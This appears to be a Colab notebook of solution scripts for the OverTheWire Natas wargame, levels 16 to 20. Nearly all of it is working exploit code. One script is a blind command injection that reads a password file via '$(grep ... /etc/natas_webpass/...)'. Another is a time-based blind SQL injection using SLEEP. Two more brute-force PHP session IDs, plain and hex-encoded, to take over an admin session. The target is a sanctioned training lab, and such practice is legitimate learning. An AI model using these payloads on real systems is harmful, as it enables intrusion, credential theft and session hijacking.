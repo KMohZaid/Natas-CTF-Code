{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyM7lPuVsrz8sEzJQuKD3X0U",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/KMohZaid/Natas-CTF-Code/blob/main/Natas_CTF_Code.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## I am using google colab for fast bruteforcing in CTF."
      ],
      "metadata": {
        "id": "-IBlDDeprBjJ"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## My PC is not fast like colab so it takes time"
      ],
      "metadata": {
        "id": "s-Kb7cB5rVRA"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "id": "bl6h79sCoYXI"
      },
      "outputs": [],
      "source": [
        "# Natas CTF level 16 -> 17\n",
        "import requests\n",
        "from time import sleep\n",
        "from string import digits, ascii_lowercase, ascii_uppercase\n",
        "\n",
        "charset = ascii_lowercase + ascii_uppercase + digits\n",
        "s = requests.Session()\n",
        "s.auth = (\"natas16\", \"<censored>\")\n",
        "\n",
        "password = \"\"\n",
        "\n",
        "# assume maximum length of password is 32 (checked and verify natas every level password is 32 lenght), if not then will increase next time for checking again\n",
        "while len(password) < 32:\n",
        "    for char in charset:\n",
        "        payload = {\n",
        "            \"needle\": \"$(grep -E ^%s.* /etc/natas_webpass/natas17)\" % (password + char)}\n",
        "        tries = 0\n",
        "        while True:\n",
        "            if tries >= 10:\n",
        "                print(\"\\nError occur 10 times, exiting...\")\n",
        "                print(\"currently finded password : \" + password)\n",
        "                exit(1)\n",
        "            try:\n",
        "                r = s.get(\n",
        "                    \"http://natas16.natas.labs.overthewire.org/index.php\", params=payload)\n",
        "                break\n",
        "            except Exception as e:\n",
        "                tries += 1\n",
        "                sleep(5)\n",
        "\n",
        "        if len(r.text) == 1105: # TODO: can be more specific by checking if dictionary words are in text or not. size may be same if some error website display with same length\n",
        "            print(char, end=\"\")\n",
        "            password += char\n",
        "            break"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Natas CTF level 17 -> 18\n",
        "import requests\n",
        "import sys\n",
        "from string import digits, ascii_lowercase, ascii_uppercase\n",
        "\n",
        "charset = ascii_lowercase + ascii_uppercase + digits\n",
        "injection = 'natas18\" AND password LIKE BINARY \"{password_starting}%\" AND SLEEP(8)-- ' # injection cool name lol, password_starting is just to make it readable\n",
        "# NOTE: BINARY make expression case sensitive not check binary value like 1001 0010 lol\n",
        "\n",
        "s = requests.Session()\n",
        "s.auth = (\"natas17\", \"<censored>\")\n",
        "\n",
        "password = \"\"\n",
        "\n",
        "while len(password) < 32:\n",
        "    for char in charset:\n",
        "        try:\n",
        "            payload = {\"username\": injection.format(password_starting=password+char)}\n",
        "            r = s.post(\"http://natas17.natas.labs.overthewire.org/\", data=payload, timeout=3)\n",
        "        except requests.Timeout:\n",
        "            print(char,end=\"\")\n",
        "            password += char\n",
        "            break"
      ],
      "metadata": {
        "id": "YyFsTkp9rFfH"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Natas CTF Level 18 -> 19\n",
        "\n",
        "import requests\n",
        "\n",
        "url = \"http://natas18.natas.labs.overthewire.org\"\n",
        "\n",
        "s = requests.Session()\n",
        "s.auth = ('natas18', '<censored>')\n",
        "\n",
        "for x in range(640):\n",
        "    cookies = {\"PHPSESSID\": str(x)}\n",
        "    r = s.get(url, cookies=cookies)\n",
        "    if \"Login as an admin to retrieve\" not in r.text:\n",
        "        print(r.text)\n",
        "        break\n"
      ],
      "metadata": {
        "id": "zi5AHEGO0DtW"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Natas CTF Level 19 -> 20\n",
        "\n",
        "# Session id is in hexadecimal eg. 3235332d61646d696e which is \"253-admin\" after converting to text\n",
        "import requests\n",
        "import binascii\n",
        "\n",
        "url = \"http://natas19.natas.labs.overthewire.org\"\n",
        "\n",
        "s = requests.Session()\n",
        "s.auth = ('natas19', '<censored>')\n",
        "i=1\n",
        "while True:\n",
        "    cookies = {\"PHPSESSID\": binascii.hexlify(bytes(f\"{i}-admin\",\"ascii\")).decode()}\n",
        "    r = s.get(url, cookies=cookies)\n",
        "    if \"Login as an admin to retrieve\" not in r.text:\n",
        "        print(r.text)\n",
        "        break\n",
        "    i+=1\n"
      ],
      "metadata": {
        "id": "BYDIT4NV2Ej2"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}